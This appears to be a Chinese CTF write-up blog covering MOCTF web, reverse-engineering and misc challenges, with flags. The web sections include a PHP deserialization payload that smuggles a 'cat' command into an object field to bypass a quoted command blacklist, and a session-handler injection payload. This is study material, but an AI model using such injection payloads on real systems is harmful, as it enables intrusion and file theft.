system(&quot;php .//class//win.php&quot;); &#125; die(); &#125; public function nothing() &#123; die(&quot;&lt;center&gt;You lose&lt;/center&gt;&quot;); &#125; public function __destruct() &#123; waf($this-&gt;bag); if($this-&gt;weapon===&apos;AWM&apos;) &#123; $this-&gt;Get_air_drops($this-&gt;bag); &#125; else &#123; die(&apos;&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;&apos;); &#125; &#125; &#125;?&gt; 参考了这几篇文章：http://blog.csdn.net/qq_27446553/article/details/53378847http://blog.csdn.net/qq_31481187/article/details/60968595http://blog.csdn.net/qq_31481187/article/details/53189113http://www.jb51.net/article/107101.htm 理解序列化的字符串（unserlialize的参数）：1234567891011O:3:”foo”:2:&#123;s:4:”file”;s:9:”shell.php”;s:4:”data”;s:5:”aaaaa”;&#125;O:3: 参数类型为对象(object),数组(array)为a“foo”:2: 参数名为foo，有两个值S:4:”file”;s:9:”shell.php”; s:参数类型为字符串(数字为i)，长度为4，值为file。长度为9的字符串shell.phps:4:”data”;s:5:”aaaaa”;&#125; 长度为4的字符串data，长度为5的字符串aaaaaobject foo，属性file：shell.php，属性data：aaaaa 绕过__wakeup方法12成员属性数目大于实际数目时可绕过wakeup方法，把 O:6:”HITCON”:3 中的3改为任意比3大数字即可；另一种绕过方法为对wakeup过滤的绕过，利用了sql注入中的/**/ 读一下waf.php得到12345678910function waf($values)&#123; //$black = []; $black = array(&apos;vi&apos;,&apos;awk&apos;,&apos;-&apos;,&apos;sed&apos;,&apos;comm&apos;,&apos;diff&apos;,&apos;grep&apos;,&apos;cp&apos;,&apos;mv&apos;,&apos;nl&apos;,&apos;less&apos;,&apos;od&apos;,&apos;head&apos;,&apos;tail&apos;,&apos;more&apos;,&apos;tac&apos;,&apos;rm&apos;,&apos;ls&apos;,&apos;tailf&apos;,&apos;%&apos;,&apos;%0a&apos;,&apos;%0d&apos;,&apos;%00&apos;,&apos;ls&apos;,&apos;echo&apos;,&apos;ps&apos;,&apos;&gt;&apos;,&apos;&lt;&apos;,&apos;$&#123;IFS&#125;&apos;,&apos;ifconfig&apos;,&apos;mkdir&apos;,&apos;cp&apos;,&apos;chmod&apos;,&apos;wget&apos;,&apos;curl&apos;,&apos;http&apos;,&apos;www&apos;,&apos;`&apos;,&apos;printf&apos;); foreach ($black as $key =&gt; $value) &#123; if(stripos($values,$value))&#123; die(&quot;Attack!&quot;); &#125; &#125;&#125; 我们构造123456789&lt;?phpinclude &apos;class.php&apos;;$a = new sheldon()$a-&gt;weapon = &apos;AWM&apos;;$a-&gt;bag = &apos;flag.php./&apos;;var_dump(serialize($a));?&gt; payload为：1http://120.78.57.208:6001/?LandIn=school&amp;pubg=O:7:%22sheldon%22:20:&#123;s:3:%22bag%22;s:23:%22flag.php;cat%20class/flag%22;s:6:%22weapon%22;s:3:%22AWM%22;&#125; 在源码里可得flag：1flag:moctf&#123;Try_Learn_PhP_h4rder&#125; 登录一哈刚开始不会，后面放hint提示“开发人员用git管理过代码”，我们想到.git文件泄露，用GitHack把源码还原，得到两个php文件:index.php主要代码12345678910111213&lt;?php ini_set(&apos;session.serialize_handler&apos;, &apos;php_binary&apos;); session_start(); if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123; $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; $_SESSION[&quot;username&quot;] = $username; header(&quot;Location:./index.php&quot;); &#125; else if(isset($_SESSION[&quot;username&quot;]))&#123; echo &apos;&lt;h1&gt;hello &apos;.$_SESSION[&quot;username&quot;].&apos;&lt;/h1&gt;&apos;; &#125; flag.php主要代码123456789101112&lt;?phpsession_start();class MOCTF&#123; public $flag; public $name; function __destruct()&#123; $this-&gt;flag = &quot;moctf&#123;xxxxxxxxxxxxxxxxxxx&#125;&quot;; if($this-&gt;flag == $this-&gt;name)&#123; echo &quot;Wow,this is flag:&quot;.$this-&gt;flag; &#125; &#125;&#125; 这里也是一个序列化的问题，这里参考了http://blog.csdn.net/qq_31481187/article/details/60968595http://blog.csdn.net/qq_31481187/article/details/53189113http://www.jb51.net/article/107101.htm 所以我们构造的payload为1|O:5:&quot;MOCTF&quot;:2:&#123;s:4:&quot;flag&quot;;N;s:4:&quot;name&quot;;i:0;&#125; 登陆后为 然后访问flag.php，得到flag。1Wow,this is flag:moctf&#123;ser1ali2e_h4ndler_1s_c00l&#125; RE篇easyre用IDA打开qiandao这个文件，在hex-view看到猜想可能是12345moctf&#123;Sign-in.desk.english?&#125;moctf&#123;Sign-in-desk-english?&#125;moctf&#123;Sign-indesk-english?&#125; 都试了一下得到flag。1flag:moctf&#123;Sign-indesk-english?&#125; 我的VIP呢，那么大个的VIP是一道安卓逆向，下载apk，用apktoolbox进行jadx，拿到源码，分析了一下主要的几个函数，发现有一个VipFunction的函数123456public class VipFunction extends Activity &#123; protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView(R.layout.vipfunction); &#125;&#125; 我们找到R.layout.vipfunction所在的位置1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;RelativeLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:orientation=&quot;vertical&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot;&gt; &lt;TextView android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:text=&quot;moctf&#123;20180202mqlsys&#125;&quot; android:layout_centerInParent=&quot;true&quot; /&gt;&lt;/RelativeLayout&gt; 发现flag就在这里。1flag：moctf&#123;20180202mqlsys&#125; 哇，有毒吧同样是安卓逆向，用apktoolbox进行jadx，关注这段源码1234567891011121314151617public void check(String name, String pass) &#123; if (name.equals(&quot;MQLSY_s&quot;) &amp;&amp; pass.equals(&quot;66666&quot;)) &#123; Toast.makeText(this, &quot;bW9jdGZ7dGhlX0NURl9JU18/fQ==&quot;, 0).show(); &#125; else if (name.equals(&quot;mqlsys&quot;) &amp;&amp; pass.equals(&quot;23333&quot;)) &#123; Toast.makeText(this, &quot;bW9jdGZ7ZmFsc2U/fQ==&quot;, 0).show(); &#125; else if (name.equals(BuildConfig.FLAVOR) &amp;&amp; pass.equals(BuildConfig.FLAVOR)) &#123; Toast.makeText(this, &quot;\u54c7\uff0c\u8fd9\u4f60\u90fd\u6562\u5c1d\u8bd5\uff0c\u5389\u5bb3\u5389\u5bb3&quot;, 0).show(); &#125; else if (name.equals(&quot;MQL&quot;) &amp;&amp; pass.equals(&quot;2018&quot;)) &#123; Toast.makeText(this, &quot;bW9jdGZ7dGhpc19pc24ndF9mbGFnfQ==&quot;, 0).show(); &#125; else if (name.equals(&quot;admin&quot;) &amp;&amp; pass.equals(&quot;admin&quot;)) &#123; Toast.makeText(this, &quot;\u767b\u5f55\u6210\u529f&quot;, 0).show(); &#125; else if (name.equals(&quot;MQL&quot;) &amp;&amp; pass.equals(&quot;666&quot;)) &#123; Toast.makeText(this, &quot;bW9jdGZ7dHJ1ZT99&quot;, 0).show(); &#125; else &#123; Toast.makeText(this, &quot;\u767b\u5f55\u5931\u8d25&quot;, 0).show(); &#125; &#125; 里面的几个判断语句都有name和pass,解码pass看到1234567moctf&#123;the_CTF_IS_?&#125;moctf&#123;false?&#125;哇，这你都敢尝试，厉害厉害moctf&#123;this_isn&apos;t_flag&#125;登录成功moctf&#123;true?&#125;登录失败 想试下这些能不能过，结果第一个就是我们所要的flag(脑洞有点大，老年人跟不上)。1flag：moctf&#123;the_CTF_IS_?&#125; MISC篇流量分析得到的是一个流量包，用wireshark打开看一下，发现应该是路由器配置过程的流量包，我们追踪TCP流可以看到flag。1flag: moctf&#123;c@N_y0U_4lnd_m8&#125; base全家桶得到这样一个字符串14D4A4C545332544549354E444F554C4E495A35465556525A4B4A53464F5254564C4159484134435A4B5934564B595253475658474D554A3548553D3D3D3D3D3D 全家桶应该指的是base16、base32、base64，直接用py可以解码，根据字符串特征选择解码方式，顺序是：base16—-base32——base6412345678910&gt;&gt;&gt; import base64&gt;&gt;&gt; decode = base64.b16decode(b&apos;4D4A4C545332544549354E444F554C4E495A35465556525A4B4A53464F5254564C4159484134435A4B5934564B595253475658474D554A3548553D3D3D3D3D3D&apos;)&gt;&gt;&gt; decodeb&apos;MJLTS2TEI5NDOULNIZ5FUVRZKJSFORTVLAYHA4CZKY4VKYRSGVXGMUJ5HU======&apos;&gt;&gt;&gt; decode = base64.b32decode(b&apos;MJLTS2TEI5NDOULNIZ5FUVRZKJSFORTVLAYHA4CZKY4VKYRSGVXGMUJ5HU======&apos;)&gt;&gt;&gt; decodeb&apos;bW9jdGZ7QmFzZV9RdWFuX0ppYV9Ub25nfQ==&apos;&gt;&gt;&gt; decode = base64.b64decode(b&apos;bW9jdGZ7QmFzZV9RdWFuX0ppYV9Ub25nfQ==&apos;)&gt;&gt;&gt; decodeb&apos;moctf&#123;Base_Quan_Jia_Tong&#125;&apos; 颜文字得到这样一串颜文字：1ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;);ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&apos;_&apos;]; o=(ﾟｰﾟ) =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &apos;_&apos; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &apos;_&apos;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&apos;_&apos;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&apos;_&apos;) [c^_^o];(ﾟДﾟ) [&apos;c&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&apos;o&apos;] = ((ﾟДﾟ)+&apos;_&apos;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&apos;c&apos;]+(ﾟДﾟ) [&apos;o&apos;]+(ﾟωﾟﾉ +&apos;_&apos;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&apos;_&apos;) [ﾟｰﾟ] + ((ﾟДﾟ) +&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&apos;c&apos;]+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&apos;o&apos;]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ];(ﾟДﾟ) [&apos;_&apos;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&apos;_&apos;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&apos;_&apos;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&apos;_&apos;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&apos;_&apos;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&apos;\\&apos;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&apos;_&apos;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&apos;\&quot;&apos;;(ﾟДﾟ) [&apos;_&apos;] ( (ﾟДﾟ) [&apos;_&apos;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&apos;_&apos;); 直接放控制台，回车后就可以得到flag。1flag:moctf&#123;Yan_Wen_Zi&#125; 奇怪的十六进制得到一串16进制：15a 45 64 6f 63 45 35 57 4f 48 68 6a 4d 54 6c 74 59 6b 64 46 4e 51 3d 3d 转换成ASCII转换地址：http://www.ab126.com/goju/1711.html1Z E d o c E 5 W O H h j M T l t Y k d F N Q = = 同样我们用python解码一下base64得到flag；123456&gt;&gt;&gt; decode = base64.b64decode(b&apos;ZEdocE5WOHhjMTltYkdFNQ==&apos;)&gt;&gt;&gt; decodeb&apos;dGhpNV8xc19mbGE5&apos;&gt;&gt;&gt; decode = base64.b64decode(b&apos;dGhpNV8xc19mbGE5&apos;)&gt;&gt;&gt; decodeb&apos;thi5_1s_fla9&apos; 先越过这道栅栏再说我们得到字符串为：1nzop0edv_u_1ggu&#123;1&#125; 题目提示栅栏密码，我们用CTFcrackTools看一下1第2栏：npdug&#123;z0v_g1oe_1u&#125; 再用凯撒密码解一下得到flag。1moctf&#123;y0u_f1nd_1t&#125; 空word得到一个空的word文本，这里想到前天刚做的Bugku的题目也是类似，通过显示全部格式标记，我们可以看到一些符号猜测是摩斯密码，我们整理出来后得到1-.... -.. -.... ..-. -.... ...-- --... ....- -.... -.... --... -... ....- ..--- -.... -.-. ...-- ....- -.... . -.... -... ..... ..-. ...-- ----- --... ..--- ..... ..-. --... ....- -.... .---- -.... ..--- ...-- ..-. --... -.. 解密后得到十六进制，转成ASCII后，得到flag。转换地址：http://www.ab126.com/goju/1711.html1236D6F6374667B426C346E6B5F30725F7461623F7Dmoctf&#123;Bl4nk_0r_tab?&#125; 一万年的爱有多久下载后得到一个压缩包，试着解压后，还是压缩包，结合题目应该是要不断解压才能看到flag，这里直接用python脚本来实现解压缩包：123456789101112import zipfileimport osfor i in range(10000): file_list = os.listdir(r&apos;.&apos;) for file_name in file_list: if os.path.splitext(file_name)[1] == &apos;.zip&apos;: file_zip = zipfile.ZipFile(file_name, &apos;r&apos;) for file in file_zip.namelist(): file_zip.extract(file, r&apos;.&apos;) file_zip.close() os.remove(file_name) 解压完得到flag文件，用编辑器打开可得到flag。1flag:moctf&#123;Just_a_few_minutes&#125; 是兄弟就来干我得到一张tanwanlanyue.png和一个压缩包,用binwalk看了一下都没东西，用Stegsolve打开，试了一下lsb隐写，在BGR排序下看到是一张png图片 我们把他保存成bin文件，然后用winhex打开，发现文件头不对，删掉多余的字符，然后保存 得到一张图片 我们猜测压缩包密码就是图片上用红点表示的内容(zhazhahui)，发现能打开压缩包，得到1f_hfv7m_y8&#123;kThk43a_xrk0?n&#125; 先用栅栏密码解密，再用凯撒密码解密可得到flag。1234第1栏：fhvmy&#123;Tk3_r0n_f7_8kh4axk?&#125;第2栏：fh_kh4f3va7_mx_ryk80&#123;?knT&#125;使用第一栏进行凯撒解密moctf&#123;Ar3_y0u_m7_8ro4her?&#125; Hacker!!!得到一个流量包，用wireshark查看后发现是以一个注入的流量，这里参考了cankao1这篇文章，先导出http对象，然后分析是盲注，当长度1326时正确，所以把一个一个把返回正常所对应的ASCII编码后的数字找出来1109 111 99 116 102 123 72 116 116 112 95 49 115 95 100 52 110 103 51 114 73 48 117 53 125 对着ASCII表解码一下可以得到flag。1flag:moctf&#123;Http_1s_d4ng3rI0u5&#125; 李华的疑惑得到一个压缩包，解压后有一个压缩包和一个password.txt，password.txt有规律的排列,均为3个一组，一共22500行 这里想到可能是代表RGB三个通道，可以试着能不能按照150X150还原图片，这里参考了http://blog.csdn.net/ssjjtt1997/article/details/78450816使用python的PIL进行图片还原1234567891011121314151617from PIL import Imagex = 150 #x坐标 通过对txt里的行数进行整数分解y = 150 #y坐标 x * y = 行数im = Image.new(&quot;RGB&quot;, (x, y)) #创建图片file = open(&apos;password.txt&apos;) #打开rbg值的文件#通过每个rgb点生成图片for i in range(0, x): for j in range(0, y): line = file.readline() #获取一行的rgb值 rgb = line.split(&quot;,&quot;) #分离rgb，文本中逗号后面有空格 im.putpixel((i,j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) #将rgb转化为像素im.save(&apos;flag.jpg&apos;) 得到flag.jpg 得到密码解开压缩包得到字符串1U2FsdGVkX18R9EylBVacP/j0XpCISh9nZth6TFwoh5GUv0edeVp3ZV9gXVqd/rlH66OIZgSHn2Mock4hcdqFEg== 试了一下base64，发现不行，这里想到之前好像见过类似的使用AES进行解密，这里一个在线解密地址http://tool.oschina.net/encrypt来解密，可以得到flag。1flag:moctf&#123;D0_You_1ik3_tO_pAinH_wi4h_pi8e1&#125; 签到签到题目问的是集五福能平分多少钱，打开支付宝开了一下，发现是五亿，结合题目的提示，可得flag。1flag: moctf&#123;500000000&#125;]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BugKu新赛季（持续更新）]]></title>
    <url>%2F2018%2F02%2F11%2FBugKu%E6%96%B0%E8%B5%9B%E5%AD%A3%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89%2F</url>
    <content type="text"><![CDATA[BugKu新赛季题目地址：http://ctf.bugku.com/challenges 杂项签到题关注BugKu的微信公众号即可获取flag； 这是一张单纯的图片下载图片用winhex打开，可以看到末尾有一段奇怪的字符串1#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125; 第一直觉用ASCII表来对照一下，发现就是我们所要的flag； 隐写首先打开图片看一下，发现像素是500X420，这里想到可能是png像素隐写，这里参考余老师的一篇文章png像素隐写我们用winhex将像素调整为500X500后，可以在图片下方得到我们所要的flag； telnet这是一个流量分析题，用wireshark打开流量包分析，发现这是一个登陆的过程，flag是password，所以找到输入的password，我们可以得到flag；123456Frame 41: 92 bytes on wire (736 bits), 92 bytes captured (736 bits)Ethernet II, Src: Vmware_84:86:5f (00:0c:29:84:86:5f), Dst: Vmware_26:7e:0e (00:0c:29:26:7e:0e)Internet Protocol Version 4, Src: 192.168.221.128, Dst: 192.168.221.164Transmission Control Protocol, Src Port: 1146, Dst Port: 23, Seq: 83, Ack: 124, Len: 38Telnet Data: flag&#123;d316759c281bf925d600be698a4973d5&#125; 眼见非实（ISCCCTF）下载下来发现在win下打不来，但是文件名提示是zip，应该是一个压缩包，这里我直接把文件放到kali里面打开，得到一些.xml的文件，一个个看过去，在document.xml里面找到了flag；123456789101112131415161718192021222324-&lt;w:p w:rsidRDefault=&quot;002B3D8D&quot; 